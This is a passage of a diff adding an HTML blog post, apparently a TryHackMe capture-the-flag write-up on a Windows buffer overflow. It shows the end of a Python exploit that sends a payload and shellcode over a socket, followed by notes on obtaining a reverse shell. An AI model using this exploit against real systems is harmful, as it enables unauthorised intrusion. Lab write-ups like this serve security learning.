+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>connect((target_ip, target_port))
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send(username <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># &#39;\r\n&#39; -&gt; return + new line : hitting enter</span>
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send(payload <span style="color:#f92672">+</span> shellcode <span style="color:#f92672">+</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Cannot connect to the server&#34;</span>)
+</span></span></code></pre></div><p>When I ran the script without adding any <code>nop</code> instructions, it would not work.
+After adding a few bytes of <code>nop</code> instructions, I was able to create the reverse
+shell connection between the Kali VM and the Windows VM.</p>
+<p>Now it is time to test the script on the actual target of this challenge and the
+Kali VM&rsquo;s IP address (the one that is connected to the THM&rsquo;s VPN tunnel -
+<code>tun0</code>).</p>
+<p><img alt="brainstrom-access.png" loading="lazy" src="/images/brainstrom-access.png"></p>
+<p>After modifying the script, I was able to access the target machine.</p>
+<h2 id="things-i-learned-from-this-room">Things I learned from this room<a hidden class="anchor" aria-hidden="true" href="#things-i-learned-from-this-room">#</a></h2>
+<ul>
+<li>Allowing communication (networking) between Guest VMs</li>
+<li>The use of Immunity Debugger and Mona script</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://joonkim0625.github.io/tags/ctf/">CTF</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/tryhackme/">TryHackMe</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/cybersecurity/">Cybersecurity</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/windows/">Windows</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/reverse-shell/">Reverse Shell</a></li>
+      <li><a href="https://joonkim0625.github.io/tags/buffer-overflow/">Buffer Overflow</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://joonkim0625.github.io/">All Things Cyber – joonkim0625</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
